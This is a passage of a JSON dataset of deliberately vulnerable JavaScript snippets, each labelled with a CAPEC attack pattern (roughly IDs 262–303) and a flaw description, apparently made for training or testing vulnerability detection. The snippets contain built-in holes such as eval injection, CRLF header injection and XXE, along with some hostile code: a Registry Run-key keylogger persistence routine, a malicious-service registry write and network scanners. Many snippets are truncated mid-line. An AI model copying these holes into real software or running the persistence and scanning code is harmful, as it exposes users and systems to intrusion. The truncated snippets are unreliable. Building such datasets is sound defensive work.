        "description": "This vulnerable code demonstrates multiple security issues: SQL injection through unvalidated user input, exposure of sensitive information in error messages, and improper query construction. The code directly interpolates user input into an SQL query without sanitization and returns detailed error information including database queries and stack traces."
    },
    {
        "capec_id": "263",
        "capec_name": "Force Use of Corrupted Files",
        "code_snippet": "`\nconst fs = require('fs');\nconst path = require('path');\n\nfunction processUserFile(userFilePath) {\n  // Blindly trust the file extension\n  const ext = path.extname(userFilePath);\n  \n  if(ext === '.txt') {\n    // Create temporary file without proper checks\n    const tempFile = '/tmp/userfile_' + Math.random();\n    fs.copyFileSync(userFilePath, tempFile);\n    \n    // Process file without validation\n    const content = fs.readFileSync(tempFile);\n    \n    // Unsafe dynamic require of user-controlled file\n    const processor = require(content.toString().trim());\n    processor.execute();\n    \n    // Clean up temp file - but file might have been tampered with\n    fs.unlinkSync(tempFile);",
        "description": "\"This code demonstrates multiple vulnerabilities including unsafe file handling, reliance on file extensions, insecure temporary files, and dynamic loading of untrusted content. It blindly processes files based on extensions, creates insecure temporary files, and attempts to execute potentially malicious content through unsafe requires.\""
    },
    {
        "capec_id": "264",
        "capec_name": "DEPRECATED: Environment Variable Manipulation",
        "code_snippet": "// Global variables used throughout the application\nvar userInput = '';\nvar dbConnection = null;\nvar CONFIG = 'development';\n\nfunction processUserData() {\n    // Get user input from a form\n    userInput = document.getElementById('userInput').value;\n    \n    // Dangerous eval usage with unvalidated input\n    var result = eval('(' + userInput + ')');\n    \n    // Using literal values instead of symbolic constants\n    if(CONFIG === 'development') {\n        var debugMode = true;\n        var serverUrl = 'http://localhost:8080';\n        eval('console.log(\"Debug: \" + ' + userInput + ')');\n    }\n    \n    // Function modifying global state\n    setGlobalConnection();\n    processData(result);\n}\n\nfunction setGlobalConnection() {\n    dbConnection = new DatabaseConnection();\n}\n\nfunction processData(data) {\n    // Using global variables instead of passing as parameters\n    dbConnection.query(userInput);\n}",
        "description": "This code demonstrates multiple vulnerabilities including eval injection through unvalidated user input, excessive use of global variables, improper scope of variable declarations, and use of literal constants instead of symbolic ones. The code allows for dynamic evaluation of user input without proper sanitization, while also maintaining state through global variables that could be modified from multiple locations."
    },
    {
        "capec_id": "265",
        "capec_name": "DEPRECATED: Global variable manipulation",
        "code_snippet": "var userInput = getUrlParameter('input');\nvar globalData = {};\n\nfunction processUserData() {\n    eval('globalData.' + userInput + ' = \"sensitive_data\"');\n}\n\nfunction displayData() {\n    var result;\n    eval('result = globalData.' + userInput);\n    document.getElementById('output').innerHTML = result;\n}\n\nfunction getUrlParameter(name) {\n    return new URLSearchParams(window.location.search).get(name);\n}\n\nprocessUserData();\ndisplayData();",
        "description": "The code demonstrates multiple vulnerabilities through excessive use of global variables (globalData), dynamic variable evaluation using eval(), and user-controlled input directly influencing variable access. The global scope of variables and dynamic evaluation allows an attacker to manipulate and access arbitrary data through URL parameters."
    },
    {
        "capec_id": "266",
        "capec_name": "DEPRECATED: Manipulate Canonicalization",
        "code_snippet": "function processUserData(userInput) {\n    let sanitizedInput = userInput.trim();\n    if (validateInput(sanitizedInput)) {\n        const userObj = {};\n        // Dynamically set object properties based on input\n        eval('userObj.' + sanitizedInput);\n        \n        // Compiler might optimize out this security check\n        if (process.env.NODE_ENV === 'production') {\n            checkSecurity(userObj);\n        }\n        \n        // Canonicalization happens after validation\n        sanitizedInput = decodeURIComponent(sanitizedInput);\n        return userObj;\n    }\n    return null;\n}\n\nfunction validateInput(input) {\n    return input.length > 0 && !input.includes('script');\n}\n\nfunction checkSecurity(obj) {\n    // Security check that might be removed by compiler optimization\n    if (obj.hasOwnProperty('admin')) {\n        throw new Error('Unauthorized modification');\n    }\n}",
        "description": "This code contains multiple vulnerabilities: it validates input before canonicalization, uses eval() for dynamic property assignment, includes security checks that might be removed by compiler optimization, and allows uncontrolled modification of object attributes through dynamic evaluation. The code processes user input unsafely and allows for potential injection attacks."
    },
    {
        "capec_id": "267",
        "capec_name": "Leverage Alternate Encoding",
        "code_snippet": "function processUserInput(input) {\n  // Vulnerable validation before decoding\n  if (!input.match(/[<>]/)) {\n    // Decode URL-encoded input\n    let decodedInput = decodeURIComponent(input);\n    \n    // Use the decoded input in file operations\n    let fileName = './userFiles/' + decodedInput;\n    \n    // Process the file content\n    let content = readFileSync(fileName, 'utf8');\n    \n    // Construct HTML output without proper encoding\n    return '<div>' + content + '</div>';\n  }\n  return 'Invalid input';\n}",
        "description": "This code demonstrates improper handling of alternate encodings by validating input before decoding, which can allow bypass of security checks. It also shows unsafe file operations with user input and improper output encoding that could lead to XSS vulnerabilities. The validation uses an incomplete denylist that only checks for < and > characters, which can be bypassed using encoded values."
    },
    {
        "capec_id": "268",
        "capec_name": "Audit Log Manipulation",
        "code_snippet": "function logUserActivity(userId, action) {\n    let logEntry = `User ${userId} performed ${action} at ${new Date()}`;\n    let sensitiveData = {\n        creditCard: '1234-5678-9012-3456',\n        ssn: '123-45-6789',\n        password: 'secretpass123'\n    };\n    \n    // Insecure logging of sensitive data\n    console.log(logEntry + ' with credentials: ' + JSON.stringify(sensitiveData));\n    \n    // Vulnerable log file writing\n    let logFile = '/var/log/app.log';\n    fs.appendFileSync(logFile, logEntry + '\\n', {\n        mode: 0o666 // World-readable/writable permissions\n    });\n    \n    // No input validation allowing log injection\n    let userInput = action.replace('\\n', '\\\\n');\n    fs.appendFileSync(logFile, `User input: ${userInput}\\n`);\n}",
        "description": "This code demonstrates vulnerable logging practices including exposure of sensitive information in logs, insufficient log entry sanitization allowing log injection, excessive data logging, and insecure log file permissions. The code directly logs sensitive data like credit cards and SSNs, uses world-readable permissions, and lacks proper input validation for log entries."
    },
    {
        "capec_id": "269",
        "capec_name": "DEPRECATED: Registry Manipulation",
        "code_snippet": "const registry = require('winreg');\n\nfunction storeCredentials(username, password) {\n  const regKey = new registry({\n    hive: registry.HKCU,\n    key: '\\\\Software\\\\MyApp\\\\Credentials'\n  });\n\n  regKey.set('username', registry.REG_SZ, username, (err) => {\n    if (err) console.error(err);\n  });\n  \n  regKey.set('password', registry.REG_SZ, password, (err) => {\n    if (err) console.error(err);\n  });\n}\n\nfunction modifySystemRegistry() {\n  if (process.getuid && process.getuid() === 0) {\n    const sysKey = new registry({\n      hive: registry.HKLM,\n      key: '\\\\SYSTEM\\\\CurrentControlSet\\\\Services'\n    });\n    \n    sysKey.set('AutoStart', registry.REG_SZ, 'malicious_service', (err) => {\n      if (err) console.error(err);\n    });\n  }\n}",
        "description": "This code demonstrates vulnerable registry manipulation by storing sensitive credentials in cleartext and attempting privileged registry modifications without proper access controls or validation. It exhibits issues with cleartext storage (CWE-314) and privilege context switching (CWE-270), allowing unauthorized registry modifications when executed with elevated privileges."
    },
    {
        "capec_id": "270",
        "capec_name": "Modification of Registry Run Keys",
        "code_snippet": "const Registry = require('winreg');\nconst regKey = new Registry({\n    hive: Registry.HKCU,\n    key: '\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run'\n});\n\nfunction installPersistentPayload() {\n    const defaultKey = 'SystemUpdate';\n    const defaultPath = 'C:\\\\Windows\\\\temp\\\\keylogger.exe';\n    const defaultCryptoKey = '1234567890abcdef';\n\n    regKey.set(defaultKey, Registry.REG_SZ, defaultPath, (err) => {\n        if (!err) {\n            console.log('Successfully added to startup');\n            startLogger(defaultCryptoKey);\n        }\n    });\n}\n\nfunction startLogger(key) {\n    const data = {\n        username: 'admin',\n        password: 'admin123',\n        logPath: 'C:\\\\logs\\\\keystrokes.txt'\n    };\n    \n    regKey.set('LoggerConfig', Registry.REG_SZ, JSON.stringify(data), (err) => {});\n}",
        "description": "This code creates a Windows registry entry under the Run key to achieve persistence, using default credentials and storing sensitive configuration in cleartext. It adds a malicious executable to run at user login and stores logging configuration in the registry without encryption."
    },
    {
        "capec_id": "271",
        "capec_name": "Schema Poisoning",
        "code_snippet": "const userProvidedSchema = JSON.parse(req.body.schema);\nconst systemSchema = require('./system-schema.json');\n\nfunction mergeSchemas(base, override) {\n    Object.assign(base, override);\n    return base;\n}\n\nconst configuredSchema = mergeSchemas(systemSchema, userProvidedSchema);\n\nfunction processSecureData(data) {\n    return data.map(item => {\n        return validateAgainstSchema(item, configuredSchema);\n    });\n}\n\nconst sensitiveData = loadSensitiveSystemData();\nconst processedData = processSecureData(sensitiveData);\nfs.writeFileSync('output.json', JSON.stringify(processedData));",
        "description": "This code allows external control of a schema definition, merging untrusted user input with a trusted system schema without proper validation. The merged schema is then used to process sensitive data, potentially exposing system information or allowing manipulation of data validation rules. The processed data is stored without properly sanitizing sensitive information."
    },
    {
        "capec_id": "272",
        "capec_name": "Protocol Manipulation",
        "code_snippet": "`\nconst ws = new WebSocket('ws://example.com/chat');\nlet authToken = '';\n\nfunction login(username, password) {\n    ws.send(JSON.stringify({\n        type: 'auth',\n        username: username,\n        password: password",
        "description": "\"This vulnerable WebSocket implementation demonstrates multiple protocol-related security issues: it lacks proper message origin verification, is susceptible to replay attacks due to simple token-based authentication, doesn't verify message integrity during transmission, and implements a weak authentication protocol that could be exploited through reflection attacks. The code blindly trusts incoming messages and doesn't properly validate the communication channel's security properties.\""
    },
    {
        "capec_id": "273",
        "capec_name": "HTTP Response Smuggling",
        "code_snippet": "`\nconst http = require('http');\nconst server = http.createServer((req, res) => {\n  let userInput = req.headers['x-user-data'] || '';\n  \n  // Vulnerable: No sanitization of CRLF or special characters\n  let responseHeader = 'X-Custom-Header: ' + userInput;\n  \n  // Vulnerable: Multiple response headers due to CRLF injection\n  res.writeHead(200, {\n    'Content-Type': 'text/html',\n    'X-Custom-Header': responseHeader",
        "description": "\"A vulnerable HTTP server that allows HTTP response smuggling through header injection and CRLF sequences. The code doesn't sanitize user input in headers, enables response splitting via CRLF injection, and delivers raw unparsed content, allowing an attacker to inject unauthorized HTTP responses that could be interpreted differently by downstream components.\""
    },
    {
        "capec_id": "274",
        "capec_name": "HTTP Verb Tampering",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.use((req, res, next) => {\n    // Insecure authentication based only on HTTP method\n    if (req.method === 'GET') {\n        // Allow unrestricted access for GET requests\n        next();\n    } else if (req.method === 'POST') {\n        // Basic check for admin token only on POST\n        if (req.headers['admin-token'] === 'secret123') {\n            next();\n        } else {\n            res.status(403).send('Forbidden');\n        }\n    }\n});\n\napp.all('/sensitive-data', (req, res) => {\n    // Sensitive data accessible via any HTTP method\n    const userData = {\n        creditCard: '1234-5678-9012-3456',\n        ssn: '123-45-6789'\n    };\n    res.json(userData);\n});",
        "description": "This code demonstrates a vulnerable authentication mechanism that relies solely on the HTTP method to make security decisions. The application assumes GET requests are safe and only enforces authentication on POST requests. An attacker can bypass this by using different HTTP methods or modifying the request method to access sensitive data. The code also exposes sensitive information through all HTTP methods without proper verification."
    },
    {
        "capec_id": "275",
        "capec_name": "DNS Rebinding",
        "code_snippet": "const dns = require('dns');\nconst http = require('http');\n\nconst server = http.createServer((req, res) => {\n    const clientIP = req.connection.remoteAddress;\n    \n    dns.reverse(clientIP, (err, hostnames) => {\n        if (err) {\n            res.end('Error');\n            return;\n        }\n        \n        if (hostnames[0].endsWith('.trusted-domain.com')) {\n            // Vulnerable: trusting reverse DNS for authentication\n            res.writeHead(302, {\n                'Location': `http://${hostnames[0]}:8080/internal-resource`\n            });\n            res.end();\n        }\n    });\n});\n\nserver.listen(0, '0.0.0.0');  // Binding to all interfaces",
        "description": "This code demonstrates vulnerable DNS rebinding by relying on reverse DNS resolution for security decisions and binding to all interfaces (0.0.0.0). It redirects users to internal resources based on untrusted hostname resolution, potentially allowing access to internal network resources through DNS manipulation."
    },
    {
        "capec_id": "276",
        "capec_name": "Inter-component Protocol Manipulation",
        "code_snippet": "`\n// Vulnerable inter-component communication implementation\nclass MessageBus {\n  constructor() {\n    this.subscribers = {",
        "description": "\"This code demonstrates a vulnerable implementation of an inter-component communication system that includes multiple security flaws: cleartext transmission of sensitive data, lack of message integrity checks, improper security identifier conversion, debug features accessible at runtime, and no proper message validation or sanitization.\""
    },
    {
        "capec_id": "277",
        "capec_name": "Data Interchange Protocol Manipulation",
        "code_snippet": "const processB2BMessage = (xmlData) => {\n  const parser = new DOMParser();\n  const doc = parser.parseFromString(xmlData, 'text/xml');\n  \n  // Assume message authenticity based on sender ID\n  const senderId = doc.getElementsByTagName('sender')[0].textContent;\n  const trustedSenders = ['company1', 'company2'];\n  \n  if(trustedSenders.includes(senderId)) {\n    // Process sensitive data without proper validation\n    const purchaseOrder = doc.getElementsByTagName('order')[0];\n    const creditCard = doc.getElementsByTagName('payment')[0];\n    \n    // Send data including sensitive information to business partner\n    sendToPartner({\n      orderData: purchaseOrder.textContent,\n      paymentInfo: creditCard.textContent,\n      senderIdentity: senderId\n    });\n  }\n}",
        "description": "This code demonstrates multiple vulnerabilities in B2B data interchange: it assumes sender ID immutability for authentication (CWE-302), fails to properly validate XML structure (CWE-707), includes sensitive payment data in transmissions (CWE-201), and makes assumptions about XML data layout without proper validation (CWE-188). The code blindly trusts the sender ID and processes sensitive data without proper security controls."
    },
    {
        "capec_id": "278",
        "capec_name": "Web Services Protocol Manipulation",
        "code_snippet": "`\n    // Vulnerable web service implementation\n    const express = require('express');\n    const app = express();\n    app.use(express.json());\n\n    let userSessions = {",
        "description": "\"This code demonstrates multiple vulnerabilities in a web service implementation. It lacks proper input validation for role parameters, relies on client-side security enforcement through user-provided session data, and doesn't properly validate the structure of incoming requests. The code allows for privilege escalation by manipulating the role parameter during login, and the session management is susceptible to race conditions due to non-atomic operations on the userSessions object.\""
    },
    {
        "capec_id": "279",
        "capec_name": "SOAP Manipulation",
        "code_snippet": "const soap = require('soap');\nconst url = 'http://example.com/service?wsdl';\n\nconst client = soap.createClient(url, {\n  disableCache: true,\n  valueKey: '$value',\n  xmlKey: '$xml'\n});\n\n// Vulnerable SOAP client implementation\nfunction processSOAPRequest(xmlData) {\n  // No XML validation or sanitization\n  const params = {\n    auth: {\n      token: 'user123',\n      timestamp: Date.now()\n    },\n    payload: xmlData\n  };\n\n  // Client-side only authentication\n  if (params.auth.token) {\n    client.MyOperation(params, function(err, result) {\n      // Process external XML entities without restriction\n      const response = result.return;\n      // No replay protection implemented\n      return response;\n    });\n  }\n}",
        "description": "This code demonstrates vulnerable SOAP client implementation with multiple security issues: lack of XML validation, client-side only authentication, unrestricted XML external entity processing, and no protection against replay attacks. The code accepts raw XML data without sanitization, processes external entities without restrictions, and implements authentication only on the client side, making it susceptible to manipulation and replay attacks."
    },
    {
        "capec_id": "280",
        "capec_name": "DEPRECATED: SOAP Parameter Tampering",
        "code_snippet": "const soap = require('soap');\nconst express = require('express');\nconst app = express();\n\n// Expose WSDL file with sensitive information\nconst wsdlFile = '/service.wsdl';\nconst service = {\n    MyService: {\n        MyPort: {\n            authUser: function(args) {\n                // Store auth token without validation\n                let token = args.token;\n                return {\n                    success: true,\n                    dbCredentials: 'db_user:password123',\n                    apiKey: 'secret_api_key_1234'\n                };\n            },\n            processRequest: function(args) {\n                // No replay protection\n                if (args.authToken) {\n                    // Process without validating token freshness\n                    return { result: 'processed' };\n                }\n            }\n        }\n    }\n};\n\nsoap.listen(app, '/wsdl', service, wsdlFile);",
        "description": "This vulnerable code exposes a SOAP web service with multiple security issues: it exposes sensitive information in the WSDL file, lacks proper authentication validation, has no protection against replay attacks, and reveals sensitive credentials in responses. The service accepts and processes requests without proper token validation or replay protection, making it susceptible to capture-replay attacks."
    },
    {
        "capec_id": "285",
        "capec_name": "ICMP Echo Request Ping",
        "code_snippet": "`\n        const net = require('net');\n        const ping = require('ping');\n\n        function scanHost(target) {\n            // Expose system information through ping responses\n            ping.promise.probe(target, {\n                timeout: 1000,\n                extra: ['-v', '-d'],  // Verbose debug mode\n                numberOfRequests: 5",
        "description": "\"This vulnerable code implements a ping scanning functionality that exposes sensitive system information. It sends ICMP echo requests with debug flags enabled and transmits system details in cleartext. The code leaks environment variables, system information, and ping results through unencrypted channels, making it susceptible to network sniffing and information disclosure attacks.\""
    },
    {
        "capec_id": "287",
        "capec_name": "TCP SYN Scan",
        "code_snippet": "`\nconst net = require('net');\n\n// Create multiple servers on the same port (vulnerable)\nconst server1 = net.createServer((socket) => {\n    socket.write('Sensitive server data\\n', 'ascii');\n    \n    // Debug mode enabled in production\n    const debugMode = true;\n    if(debugMode) {\n        socket.write('System info: ' + JSON.stringify({\n            os: process.platform,\n            memory: process.memoryUsage(),\n            env: process.env,\n            ports: server1._connections",
        "description": "\"This code demonstrates multiple vulnerabilities: binding multiple servers to the same port (CWE-605), exposing sensitive system information through debug features (CWE-1313), transmitting sensitive data in cleartext (CWE-319), and creating an excessive attack surface by exposing unnecessary system information (CWE-1125). The code makes it easy for SYN scanning to detect open ports and gather sensitive information.\""
    },
    {
        "capec_id": "288",
        "capec_name": "DEPRECATED: ICMP Echo Request Ping",
        "code_snippet": "function authenticateUser(username, password) {\n  const token = captureNetworkToken();\n  \n  if(token) {\n    // Replay captured authentication token\n    return sendAuthRequest({\n      token: token,\n      timestamp: Date.now(),\n      credentials: btoa(username + ':' + password)\n    });\n  }\n  \n  // Fallback to DNS-based authentication\n  const dnsResult = dns.lookup(username + '.auth.example.com', (err, address) => {\n    if(!err && address) {\n      return true;\n    }\n    return false;\n  });\n}\n\nfunction captureNetworkToken() {\n  // Simulating network sniffing\n  return global.lastAuthToken;\n}",
        "description": "This code demonstrates authentication bypass vulnerabilities through capture-replay attacks and insecure DNS-based authentication. The code allows network tokens to be captured and replayed, and relies on DNS lookups for security decisions, both of which are significant security flaws that can lead to unauthorized access."
    },
    {
        "capec_id": "289",
        "capec_name": "DEPRECATED: Infrastructure-based footprinting",
        "code_snippet": "class SecureContainer {\n  constructor() {\n    this.protectedData = new Map();\n    this.unprotectedData = new Map();\n    this.cache = new SharedArrayBuffer(1024);\n  }\n\n  setProtectedData(key, value) {\n    this.protectedData.set(key, value);\n    // Vulnerable: Writing to shared cache without protection\n    new Int32Array(this.cache)[key] = value;\n  }\n\n  getProtectedData(key) {\n    // Vulnerable: No authentication check\n    // Vulnerable: Overlapping access to protected and unprotected data\n    if (this.unprotectedData.has(key)) {\n      return this.unprotectedData.get(key);\n    }\n    return new Int32Array(this.cache)[key];\n  }\n\n  createResource(name) {\n    // Vulnerable: Uncontrolled resource creation\n    this.unprotectedData.set(name, Math.random());\n    return new Worker(`data:text/javascript,${name}`);\n  }\n}",
        "description": "This code demonstrates vulnerabilities related to authentication bypass, shared microarchitectural resources, overlapping protected/unprotected memory regions, and emergent resource creation. It uses a shared cache that can leak data across contexts, fails to implement proper authentication, and allows uncontrolled creation of worker threads."
    },
    {
        "capec_id": "290",
        "capec_name": "Enumerate Mail Exchange (MX) Records",
        "code_snippet": "const dns = require('dns');\n\nfunction mailServerDiscovery(domain) {\n    dns.resolveMx(domain, (err, addresses) => {\n        if (err) {\n            console.log('Error:', err);\n            return;\n        }\n        \n        addresses.forEach(mx => {\n            // Store mail server information without encryption or access control\n            let serverInfo = {\n                host: mx.exchange,\n                priority: mx.priority,\n                ip: null\n            };\n            \n            // Perform reverse DNS lookup without validation\n            dns.reverse(mx.exchange, (err, hostnames) => {\n                if (!err) {\n                    serverInfo.ip = hostnames[0];\n                    // Log sensitive internal network information\n                    console.log('Mail Server:', serverInfo);\n                }\n            });\n        });\n    });\n}",
        "description": "This vulnerable code performs MX record enumeration and reverse DNS lookups without proper security controls. It exposes internal mail server information, performs unsafe reverse DNS resolution, and logs sensitive network topology details. The code doesn't implement access controls, input validation, or proper error handling, making it susceptible to information disclosure and DNS-based reconnaissance attacks."
    },
    {
        "capec_id": "291",
        "capec_name": "DNS Zone Transfers",
        "code_snippet": "const dns = require('dns');\n\nfunction performDNSCheck(domain) {\n    dns.resolveNs(domain, (err, addresses) => {\n        if (err) return;\n        \n        addresses.forEach(nameserver => {\n            // Attempt zone transfer from each nameserver without authentication\n            dns.resolve(domain, 'AXFR', { nameserver: nameserver }, (err, records) => {\n                if (!err && records) {\n                    // Store all retrieved DNS records without validation\n                    let zoneData = records;\n                    // Use the potentially sensitive DNS information for security decisions\n                    if (records.some(record => record.name.includes('internal'))) {\n                        allowAccess = true;\n                    }\n                }\n            });\n        });\n    });\n}\n\nperformDNSCheck('targetdomain.com');",
        "description": "This vulnerable code attempts DNS zone transfers without proper authentication and stores sensitive DNS information. It demonstrates multiple security issues: attempting unauthorized zone transfers (CWE-200), improper handling of DNS data (CWE-350), and making security decisions based on DNS information without proper validation (CWE-941). The code could expose internal network topology and sensitive host information to attackers."
    },
    {
        "capec_id": "292",
        "capec_name": "Host Discovery",
        "code_snippet": "`\n    const net = require('net');\n\n    function pingHost(ipAddress) {\n        let hosts = {",
        "description": "\"This vulnerable code implements a network scanning function that performs host discovery through ping sweeps. It contains multiple security issues: exposure of sensitive information through environment variables, unsafe reverse DNS lookups for authentication, IP-based authentication, and cleartext transmission of system information. The code allows for network reconnaissance and potentially enables unauthorized access to system information.\""
    },
    {
        "capec_id": "293",
        "capec_name": "Traceroute Route Enumeration",
        "code_snippet": "`\nasync function performNetworkTrace(targetHost) {\n  const maxHops = 30;\n  const results = [];\n  \n  for(let ttl = 1; ttl <= maxHops; ttl++) {\n    try {\n      const startTime = Date.now();\n      const response = await fetch('http://' + targetHost, {\n        method: 'HEAD',\n        headers: {\n          'Max-Forwards': ttl.toString(),\n          'Trace-Route': 'true'",
        "description": "\"This vulnerable code implements a network traceroute functionality that exposes sensitive system information through multiple vectors. It stores trace data in localStorage without encryption, transmits system information in cleartext, and doesn't properly validate the destination server. The code collects and exposes sensitive system information including server types, IP addresses, and system details through HTTP headers.\""
    },
    {
        "capec_id": "294",
        "capec_name": "ICMP Address Mask Request",
        "code_snippet": "`\nconst dgram = require('dgram');\nconst socket = dgram.createSocket('udp4');\n\nfunction sendICMPAddressMaskRequest(targetIP) {\n    // Insecurely binding to all interfaces (0.0.0.0)\n    socket.bind(0, '0.0.0.0', () => {\n        // Creating ICMP Type 17 (Address Mask Request) packet\n        const packet = Buffer.from([\n            0x11, // ICMP Type 17\n            0x00, // Code\n            0x00, 0x00, // Checksum (not calculated)\n            0x00, 0x00, // Identifier\n            0x00, 0x00, // Sequence number\n            0x00, 0x00, 0x00, 0x00 // Address mask (empty)\n        ]);\n\n        socket.send(packet, 0, packet.length, 0, targetIP, (err) => {\n            if (err) return;\n            \n            // No authentication or validation of response source\n            socket.on('message', (response) => {\n                const subnetMask = response.slice(8, 12);\n                const gateway = response.slice(12, 16);\n                // Store sensitive network configuration without checks\n                global.networkConfig = {\n                    subnet: subnetMask,\n                    gateway: gateway",
        "description": "\"This code implements an ICMP Address Mask Request (Type 17) sender that binds to all interfaces and collects subnet information from target systems without proper authentication or validation. It demonstrates multiple vulnerabilities including exposure of sensitive network information, reliance on IP addresses without proper authentication, and improper restriction of communication endpoints.\""
    },
    {
        "capec_id": "295",
        "capec_name": "Timestamp Request",
        "code_snippet": "async function authenticateUser(username, password) {\n    const startTime = Date.now();\n    const timestamp = new Date().toISOString();\n    \n    // Generate authentication token using timestamp\n    const token = await generateToken(username, timestamp);\n    \n    // Simulate token validation with timing variation\n    if (token.startsWith('valid')) {\n        await new Promise(resolve => setTimeout(resolve, 500));\n        return { success: true, token, timestamp };\n    } else {\n        await new Promise(resolve => setTimeout(resolve, 100));\n        return { success: false };\n    }\n}\n\nfunction generateToken(username, timestamp) {\n    // Weak token generation using predictable timestamp\n    return `valid_${username}_${timestamp}`;\n}\n\n// Exposed endpoint using GET method with sensitive data\napp.get('/auth', (req, res) => {\n    const { username, password } = req.query;\n    authenticateUser(username, password)\n        .then(result => res.json(result));\n});",
        "description": "This code demonstrates multiple security vulnerabilities including timestamp exposure, timing-based authentication weakness, and sensitive data exposure in GET parameters. The authentication function reveals timing differences based on success/failure, and uses predictable timestamps for token generation. The endpoint uses GET method with sensitive query parameters."
    },
    {
        "capec_id": "296",
        "capec_name": "ICMP Information Request",
        "code_snippet": "`\nconst dgram = require('dgram');\nconst socket = dgram.createSocket('udp4');\n\nfunction handleICMPRequest(msg, rinfo) {\n    // Sending system configuration information in response to ICMP request\n    const systemInfo = {\n        hostname: require('os').hostname(),\n        networkInterfaces: require('os').networkInterfaces(),\n        platform: process.platform,\n        arch: process.arch,\n        version: process.version,\n        systemMemory: require('os').totalmem()",
        "description": "\"This code creates a UDP server that responds to ICMP-like information requests by sending sensitive system information in cleartext without proper authentication or verification of the requester. It exposes system details including network interfaces, hardware information, and memory configuration to any requesting client.\""
    },
    {
        "capec_id": "297",
        "capec_name": "TCP ACK Ping",
        "code_snippet": "const net = require('net');\n\nconst tcpPinger = {\n  scanHost: function(target, port) {\n    const socket = new net.Socket();\n    \n    socket.on('error', (err) => {\n      socket.destroy();\n    });\n\n    socket.connect(port, target, () => {\n      // Send malformed ACK packet\n      const rawSocket = socket._handle;\n      if (rawSocket) {\n        const buffer = Buffer.from([0x10]); // ACK flag\n        rawSocket.write(buffer);\n      }\n    });\n\n    socket.on('data', (data) => {\n      if (data[13] & 0x04) { // Check for RST flag\n        console.log(`Host ${target} is alive`);\n      }\n      socket.destroy();\n    });\n  },\n\n  multiportScan: function(target, ports) {\n    ports.forEach(port => {\n      this.scanHost(target, port);\n    });\n  }\n}",
        "description": "This code implements a vulnerable TCP ACK ping scanner that attempts to determine if hosts are alive by sending malformed ACK packets and detecting RST responses. It creates raw sockets and sends TCP segments with ACK flags set, exposing system information through cleartext transmission. The code allows multiple concurrent connections to the same ports and doesn't properly handle asynchronous operations, making it vulnerable to race conditions and signal handling issues."
    },
    {
        "capec_id": "298",
        "capec_name": "UDP Ping",
        "code_snippet": "`\nconst dgram = require('dgram');\nconst socket = dgram.createSocket('udp4');\n\nfunction udpPingScan(target, startPort, endPort) {\n    const message = Buffer.from('PING');\n    \n    for(let port = startPort; port <= endPort; port++) {\n        socket.send(message, 0, message.length, port, target, (err) => {\n            if(err) {\n                console.log('Error:', err);\n                return;",
        "description": "\"This code implements a UDP ping scanner that sends datagrams to high ports (65000-65535) on a target host. It contains multiple vulnerabilities: it exposes system information through error messages, uses cleartext communication, binds to a fixed port without proper checks, and doesn't properly validate the target destination. The code also lacks proper error handling for ICMP responses and doesn't implement any rate limiting or access controls.\""
    },
    {
        "capec_id": "299",
        "capec_name": "TCP SYN Ping",
        "code_snippet": "const net = require('net');\n\nconst server = net.createServer((socket) => {\n    // Bind to multiple ports insecurely\n    server.listen(80);\n    server.listen(443);\n\n    // Send sensitive data in cleartext\n    socket.write('AUTH_TOKEN=12345\\nUSER_DATA=sensitive_info');\n\n    socket.on('data', (data) => {\n        // No validation of message integrity\n        if (data.toString().includes('SYN')) {\n            // Responds to SYN packets without proper validation\n            socket.write('SYN-ACK');\n            \n            // Leaks system information in response\n            socket.write(`Server: NodeJS\\nOS: ${process.platform}\\nUptime: ${process.uptime()}`);\n        }\n    });\n}).listen(3000);",
        "description": "A vulnerable server implementation that exhibits multiple security issues: it allows multiple binds to the same port, transmits sensitive data in cleartext, responds to TCP SYN probes with system information, and lacks message integrity checks. The server leaks system details in response to SYN packets, making it susceptible to host discovery techniques."
    },
    {
        "capec_id": "300",
        "capec_name": "Port Scanning",
        "code_snippet": "`\n        const net = require('net');\n        const http = require('http');\n\n        // Insecure port scanning and service detection server\n        const server = net.createServer((socket) => {\n            // Transmit sensitive system info in cleartext\n            socket.write('Server Info: ' + process.version + ' on ' + process.platform);\n            \n            // Debug mode enabled in production\n            const DEBUG_MODE = true;\n            if (DEBUG_MODE) {\n                socket.write('Debug: Internal port mappings: ' + JSON.stringify(process.env));",
        "description": "\"This code demonstrates multiple security vulnerabilities including port scanning exposure, cleartext transmission of sensitive data, multiple port bindings, debug features enabled in production, and SSRF. The server exposes system information, allows debug access, attempts multiple bindings to the same port, and blindly forwards HTTP requests to any URL provided by clients.\""
    },
    {
        "capec_id": "301",
        "capec_name": "TCP Connect Scan",
        "code_snippet": "`\nconst net = require('net');\n\n// Vulnerable TCP server that exposes system info and has multiple binds\nconst server = net.createServer((socket) => {\n  // CWE-200: Exposing sensitive system information\n  const systemInfo = {\n    os: process.platform,\n    version: process.version,\n    memory: process.memoryUsage(),\n    env: process.env",
        "description": "\"This code demonstrates a vulnerable TCP server that allows port scanning through full TCP connections. It exposes sensitive system information, relies on IP-based authentication, contains triggerable assertions, lacks data integrity checks, and allows multiple binds to the same port. An attacker can easily establish connections to enumerate open ports and access sensitive data.\""
    },
    {
        "capec_id": "302",
        "capec_name": "TCP FIN Scan",
        "code_snippet": "const net = require('net');\n\nconst server = net.createServer((socket) => {\n    socket.on('data', (data) => {\n        // Insecure handling of sensitive data\n        let userCredentials = {\n            username: 'admin',\n            password: 'secret123'\n        };\n        \n        // Send sensitive data in cleartext\n        socket.write(JSON.stringify(userCredentials));\n    });\n});\n\n// Multiple binds to same port without checks\nserver.listen(8080, '0.0.0.0');\nserver.listen(8080, '127.0.0.1');\n\n// No verification of client identity\nconst client = new net.Socket();\nclient.connect(8080, 'localhost', () => {\n    client.write('CONNECT');\n});",
        "description": "Vulnerable TCP server implementation that exposes sensitive information in cleartext, allows multiple binds to the same port, lacks proper endpoint verification, and doesn't implement proper TCP state handling or integrity checks. This makes it susceptible to TCP FIN scanning and unauthorized access."
    },
    {
        "capec_id": "303",
        "capec_name": "TCP Xmas Scan",
